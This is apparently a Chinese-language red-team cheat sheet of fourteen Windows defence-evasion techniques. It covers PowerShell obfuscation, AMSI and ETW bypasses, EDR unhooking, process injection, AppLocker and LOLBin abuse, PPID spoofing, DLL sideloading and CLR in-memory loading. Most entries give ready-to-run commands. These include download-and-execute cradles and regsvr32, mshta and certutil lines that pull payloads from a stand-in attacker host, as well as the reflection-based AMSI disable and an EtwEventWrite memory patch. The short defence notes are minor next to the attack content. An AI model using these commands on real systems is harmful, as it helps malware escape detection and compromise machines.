# 免杀与规避

_14 条 intranet payload_

### PowerShell免杀  `evasion-powershell`
_PowerShell脚本免杀技术_
子类：**PowerShell** · tags: `powershell` `evasion` `obfuscation`

**前置条件：**
- 目标机器访问权限
- Windows系统

**攻击链：**

**编码执行**
> Base64编码执行
_platform: windows_
```
powershell -enc BASE64_ENCODED_COMMAND
```
**语法解析：**
- `-enc` — Base64编码命令 _parameter_

**远程加载**
> 远程加载脚本
_platform: windows_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
```

**混淆变量名**
> 变量名混淆
_platform: windows_
```
1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
```

**无文件执行**
> 隐藏窗口无配置文件执行
_platform: windows_
```
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
```
**语法解析：**
- `-w hidden` — 隐藏窗口 _parameter_
- `-nop` — 无配置文件 _parameter_

**EDR 绕过变体：**

**降级执行**
> 使用PowerShell v2绕过日志
```
powershell -version 2 -c "command"
```


**分析：** PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。

**OPSEC 提示：**
- PowerShell日志可能记录命令
- 考虑禁用日志
- 使用混淆技术

**概述：** PowerShell是Windows强大的脚本环境，攻击者可以使用各种技术绕过检测。

**漏洞原理：** PowerShell的灵活性和强大功能使其成为攻击者的首选工具。

**利用方法：** 利用流程：1) 获取目标机器访问权限；2) 使用免杀技术；3) 执行恶意脚本；4) 完成攻击。

**防御措施：** 防御措施：1) 启用PowerShell日志；2) 使用约束语言模式；3) 监控异常PowerShell活动。

---

### AMSI绕过  `amsi-bypass`
_绕过反恶意软件扫描接口_
子类：**AMSI绕过** · tags: `amsi` `bypass` `evasion`

**前置条件：**
- PowerShell环境
- AMSI启用

**攻击链：**

**反射绕过**
> 通过反射禁用AMSI
_platform: windows_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```
**语法解析：**
- `AmsiUtils` — AMSI工具类 _keyword_
- `amsiInitFailed` — 初始化失败标志 _keyword_
- `SetValue($true)` — 设置为失败 _value_

**内存修补**
> 混淆版本绕过
_platform: windows_
```
$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
```

**DLL劫持**
> 通过DLL劫持绕过
_platform: windows_
```
替换或劫持amsi.dll
```

**使用工具**
> 使用现成工具
_platform: windows_
```
Import-Module .\AmsiBypass.ps1
Invoke-AmsiBypass
```


**概述：** AMSI是Windows的安全特性，可被多种方法绕过。

**漏洞原理：** AMSI实现存在缺陷。

**利用方法：** 利用流程：1) 检测AMSI 2) 选择绕过方法 3) 执行恶意代码

**防御措施：** 防御措施：1) 更新AMSI 2) 监控内存修改 3) 多层防护

---

### ETW Patch绕过  `etw-patch`
_禁用ETW监控_
子类：**ETW** · tags: `etw` `bypass` `evasion`

**前置条件：**
- 代码执行权限

**攻击链：**

**PowerShell禁用ETW**
> PowerShell禁用ETW
_platform: windows_
```
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
或
[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
$etw.SetEnabled(0)
```

**C#禁用ETW**
> C#禁用ETW
_platform: windows_
```
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
```

**修补ntdll**
> 修补EtwEventWrite
_platform: windows_
```
$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)
```
**语法解析：**
- `EtwEventWrite` — ETW写入函数 _keyword_
- `0xC3` — RET指令 _keyword_


**概述：** ETW是Windows的重要监控机制。

**漏洞原理：** ETW可被用户模式程序禁用。

**利用方法：** 利用流程：1) 加载ETW程序集 2) 调用禁用方法 3) 或修补函数

**防御措施：** 防御措施：1) 使用内核级监控 2) 监控ETW禁用 3) 使用EDR

---

### API Unhooking  `api-unhooking`
_移除EDR的API Hook_
子类：**Unhooking** · tags: `unhooking` `hook` `evasion`

**前置条件：**
- 代码执行权限

**攻击链：**

**从磁盘还原**
> 从磁盘读取干净DLL
_platform: windows_
```
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$base = $proc.MainModule.BaseAddress
# 找到.text段并覆盖
```

**从KnownDlls还原**
> 从KnownDlls还原
_platform: windows_
```
$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
# 复制干净的代码段
```

**Hell's Gate**
> Hell's Gate技术
_platform: windows_
```
通过系统调用号直接调用:
1. 解析NTDLL获取系统调用号
2. 直接执行syscall
3. 绕过用户模式Hook
```


**概述：** EDR通过Hook API监控程序行为。

**漏洞原理：** 用户模式Hook可被移除。

**利用方法：** 利用流程：1) 读取干净DLL 2) 覆盖Hook代码 3) 恢复原始API

**防御措施：** 防御措施：1) 内核级监控 2) 检测Unhooking 3) 多层防护

---

### 进程注入  `process-injection`
_将代码注入到其他进程_
子类：**进程注入** · tags: `injection` `process` `evasion`

**前置条件：**
- 代码执行权限

**攻击链：**

**经典DLL注入**
> DLL注入
_platform: windows_
```
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)
```
**语法解析：**
- `VirtualAllocEx` — 在目标进程分配内存 _keyword_
- `WriteProcessMemory` — 写入DLL路径 _keyword_
- `CreateRemoteThread` — 创建远程线程 _keyword_

**Process Hollowing**
> 进程镂空
_platform: windows_
```
1. CreateProcess(CREATE_SUSPENDED)
2. NtUnmapViewOfSection
3. VirtualAllocEx
4. WriteProcessMemory
5. ResumeThread
```

**APC注入**
> APC队列注入
_platform: windows_
```
$threadId = $proc.Threads[0].Id
$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)
```


**概述：** 进程注入将代码注入合法进程执行。

**漏洞原理：** Windows进程API可被滥用。

**利用方法：** 利用流程：1) 打开目标进程 2) 分配内存 3) 写入代码 4) 执行

**防御措施：** 防御措施：1) 使用EDR 2) 监控进程注入 3) 启用保护机制

---

### AppLocker绕过  `applocker-bypass`
_绕过AppLocker应用程序限制_
子类：**AppLocker** · tags: `applocker` `bypass` `evasion`

**前置条件：**
- AppLocker限制环境

**攻击链：**

**使用白名单路径**
> 使用白名单可执行文件
_platform: windows_
```
C:\Windows\System32\spoolsv.exe
C:\Windows\System32\svchost.exe
C:\Program Files\Internet Explorer\ieexec.exe
```

**LOLBAS利用**
> LOLBAS技术
_platform: windows_
```
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
mshta.exe http://attacker.com/shell.hta
certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
```

**InstallUtil**
> InstallUtil绕过
_platform: windows_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```

**MSBuild**
> MSBuild执行代码
_platform: windows_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
```


**概述：** AppLocker可限制程序执行，但存在绕过方法。

**漏洞原理：** AppLocker规则不完善。

**利用方法：** 利用流程：1) 分析限制规则 2) 找到白名单路径 3) 使用LOLBAS

**防御措施：** 防御措施：1) 完善规则 2) 监控LOLBAS 3) 使用WDAC

---

### BlockDLLs技术  `evasion-blockdlls`
_阻止非微软DLL加载_
子类：**BlockDLLs** · tags: `evasion` `blockdlls` `edr`

**前置条件：**
- Windows系统
- Cobalt Strike或其他工具

**攻击链：**

**Cobalt Strike BlockDLLs**
> 启用BlockDLLs
_platform: windows_
```
beacon> blockdlls start
阻止非微软签名的DLL加载
beacon> blockdlls stop
恢复DLL加载
```
**语法解析：**
- `blockdlls start` — 启用DLL过滤 _keyword_
- `非微软签名` — 只允许微软签名DLL _keyword_

**进程创建时启用**
> 进程创建时启用
_platform: windows_
```
使用CREATE_SUSPENDED标志创建进程
设置ProcessSignaturePolicy
阻止EDR DLL注入
```

**C#实现**
> C#实现BlockDLLs
_platform: windows_
```
[DllImport("kernel32.dll")]
static extern bool SetProcessMitigationPolicy(...);
ProcessSignaturePolicy policy = new ProcessSignaturePolicy();
policy.SignatureLevel = 0x0F;
SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
```


**概述：** BlockDLLs可阻止EDR的DLL注入。

**漏洞原理：** Windows允许进程设置DLL加载策略。

**利用方法：** 利用流程：1) 启用BlockDLLs 2) 创建子进程 3) EDR无法注入

**防御措施：** 防御措施：1) 使用内核级监控 2) ETW跟踪 3) 早期启动驱动

---

### Shellcode加密  `evasion-shellcode-encrypt`
_加密Shellcode绕过静态检测_
子类：**Shellcode加密** · tags: `evasion` `shellcode` `encrypt`

**前置条件：**
- Shellcode
- 加密工具

**攻击链：**

**AES加密Shellcode**
> AES加密
```
使用工具加密:
python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
生成加密的Shellcode和解密代码
```

**XOR加密**
> XOR加密
```
简单XOR加密:
for i in range(len(shellcode)):
    encoded[i] = shellcode[i] ^ key[i % len(key)]
运行时解密执行
```
**语法解析：**
- `XOR` — 异或加密简单有效 _keyword_
- `运行时解密` — 内存中解密执行 _keyword_

**RC4加密**
> RC4加密
```
使用RC4加密Shellcode:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
运行时使用相同密钥解密
```

**多态加密**
> 多态加密
```
每次生成不同的解密代码:
- 随机密钥
- 随机解密顺序
- 添加垃圾指令
- 控制流混淆
```


**概述：** Shellcode加密可绕过静态特征检测。

**漏洞原理：** AV依赖静态特征匹配。

**利用方法：** 利用流程：1) 加密Shellcode 2) 生成解密代码 3) 运行时解密执行

**防御措施：** 防御措施：1) 内存扫描 2) 行为分析 3) 沙箱检测

---

### 进程伪装  `evasion-process-masq`
_伪装进程名称和路径_
子类：**进程伪装** · tags: `evasion` `process` `masquerade`

**前置条件：**
- Windows系统

**攻击链：**

**PPID欺骗**
> PPID欺骗
_platform: windows_
```
Cobalt Strike:
beacon> ppid 1234
设置父进程ID为合法进程
beacon> run [command]
新进程继承合法父进程
```
**语法解析：**
- `ppid` — 设置父进程ID _keyword_
- `继承关系` — 伪装进程继承链 _keyword_

**进程参数欺骗**
> 参数欺骗
_platform: windows_
```
CreateProcess参数:
- lpApplicationName: 合法程序路径
- lpCommandLine: 包含恶意命令
- 显示为合法进程
```

**进程镂空**
> 进程镂空
_platform: windows_
```
1. 创建合法进程(挂起状态)
2. 写入恶意代码
3. 恢复线程执行
进程名显示为合法程序
```


**概述：** 进程伪装可绕过基于进程名的检测。

**漏洞原理：** Windows进程创建机制可被利用。

**利用方法：** 利用流程：1) 选择合法进程 2) 创建伪装进程 3) 执行恶意代码

**防御措施：** 防御措施：1) 检查进程内存 2) 验证代码签名 3) 监控异常行为

---

### PPID欺骗  `evasion-ppid-spoof`
_伪造父进程ID_
子类：**PPID欺骗** · tags: `evasion` `ppid` `spoofing`

**前置条件：**
- Windows系统
- 父进程句柄

**攻击链：**

**PowerShell实现**
> PowerShell PPID欺骗
_platform: windows_
```
$parent = Get-Process -Name explorer
$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName = "cmd.exe"
$pi.ParentProcessId = $parent.Id
[System.Diagnostics.Process]::Start($pi)
```

**C#实现**
> C#实现
_platform: windows_
```
[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}
使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性
```
**语法解析：**
- `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` — 设置父进程属性 _keyword_
- `lpAttributeList` — 属性列表 _keyword_

**Cobalt Strike**
> Cobalt Strike实现
_platform: windows_
```
beacon> ppid [explorer_pid]
beacon> run notepad.exe
新进程父进程为explorer.exe
```


**概述：** PPID欺骗可伪装进程的父子关系。

**漏洞原理：** Windows允许指定父进程。

**利用方法：** 利用流程：1) 获取合法进程PID 2) 创建进程时指定父进程 3) 绕过检测

**防御措施：** 防御措施：1) 检查进程树 2) 监控异常父子关系 3) ETW跟踪

---

### DLL侧加载  `evasion-dll-sideloading`
_利用DLL搜索顺序加载恶意DLL_
子类：**DLL侧加载** · tags: `evasion` `dll` `sideloading`

**前置条件：**
- Windows系统
- 可执行文件

**攻击链：**

**DLL劫持**
> DLL劫持原理
_platform: windows_
```
1. 找到可执行文件加载的DLL
2. 将恶意DLL放在搜索路径优先位置
3. 执行程序时加载恶意DLL
```

**DLL转发**
> DLL转发
_platform: windows_
```
#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
导出原始DLL的函数
同时执行恶意代码
```
**语法解析：**
- `/export:` — 导出函数 _parameter_
- `original.dll` — 转发到原始DLL _path_

**常见目标**
> 常见目标DLL
_platform: windows_
```
常见DLL劫持目标:
- version.dll
- dwmapi.dll
- uxtheme.dll
- cryptsp.dll
- winmm.dll
```


**概述：** DLL侧加载利用Windows DLL搜索顺序。

**漏洞原理：** Windows DLL搜索顺序可被利用。

**利用方法：** 利用流程：1) 分析目标程序 2) 创建恶意DLL 3) 放置在搜索路径

**防御措施：** 防御措施：1) 使用绝对路径 2) SetDllDirectory 3) 监控DLL加载

---

### 参数欺骗  `evasion-arg-spoofing`
_欺骗进程参数显示_
子类：**参数欺骗** · tags: `evasion` `argument` `spoofing`

**前置条件：**
- Windows系统

**攻击链：**

**命令行欺骗**
> 命令行欺骗
_platform: windows_
```
CreateProcess参数:
lpApplicationName = "C:\Windows\System32\cmd.exe"
lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
实际执行恶意命令
```

**环境变量欺骗**
> 环境变量欺骗
_platform: windows_
```
使用环境变量隐藏参数:
set EVIL=malicious_command
cmd /c %EVIL%
进程列表不显示实际命令
```

**PEB修改**
> PEB修改
_platform: windows_
```
修改PEB中的命令行:
1. 创建进程
2. 修改PEB中的CommandLine缓冲区
3. 进程管理器显示假参数
```
**语法解析：**
- `PEB` — 进程环境块 _keyword_
- `CommandLine` — 命令行参数存储位置 _keyword_


**概述：** 参数欺骗可隐藏实际执行的命令。

**漏洞原理：** Windows命令行显示可被修改。

**利用方法：** 利用流程：1) 创建进程 2) 修改显示参数 3) 隐藏恶意命令

**防御措施：** 防御措施：1) 内存扫描 2) ETW跟踪 3) 行为分析

---

### 签名二进制利用  `evasion-signed-binary`
_利用微软签名二进制执行代码_
子类：**签名二进制** · tags: `evasion` `signed` `lolbin`

**前置条件：**
- Windows系统

**攻击链：**

**MSBuild**
> MSBuild执行
_platform: windows_
```
msbuild.exe malicious.csproj
执行嵌入的C#代码
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

**InstallUtil**
> InstallUtil执行
_platform: windows_
```
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
执行.NET程序集
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```
**语法解析：**
- `/U` — 卸载模式执行代码 _parameter_
- `malicious.dll` — 恶意.NET程序集 _path_

**Regsvcs/Regasm**
> Regsvcs/Regasm
_platform: windows_
```
regsvcs.exe malicious.dll
regasm.exe malicious.dll
执行.NET程序集
```

**Rundll32**
> Rundll32执行
_platform: windows_
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
```


**概述：** 签名二进制是微软签名的合法程序，可被滥用执行代码。

**漏洞原理：** 微软签名程序有特殊权限。

**利用方法：** 利用流程：1) 选择合适工具 2) 准备payload 3) 使用签名程序执行

**防御措施：** 防御措施：1) 监控LOLBAS使用 2) 应用程序白名单 3) 行为分析

---

### CLR注入  `evasion-clr-injection`
_CLR内存注入技术_
子类：**CLR注入** · tags: `evasion` `clr` `injection`

**前置条件：**
- Windows系统
- .NET环境

**攻击链：**

**CLR内存加载**
> CLR加载原理
_platform: windows_
```
使用CLR接口加载.NET程序集:
1. 获取CLR运行时
2. 创建AppDomain
3. 加载程序集
4. 执行入口点
```

**C#实现**
> C# CLR加载
_platform: windows_
```
var clr = new ClrModule();
clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
clr.Execute("Main");
从内存执行.NET程序
```
**语法解析：**
- `LoadAssembly` — 从字节数组加载 _keyword_
- `Execute` — 执行入口点 _keyword_

**Cobalt Strike**
> Cobalt Strike实现
_platform: windows_
```
beacon> execute-assembly /path/to/tool.exe args
从内存执行.NET程序集
不落地执行
```


**概述：** CLR注入可从内存执行.NET程序集。

**漏洞原理：** .NET CLR允许动态加载程序集。

**利用方法：** 利用流程：1) 获取CLR接口 2) 加载程序集 3) 执行代码

**防御措施：** 防御措施：1) AMSI监控 2) 内存扫描 3) ETW跟踪

---
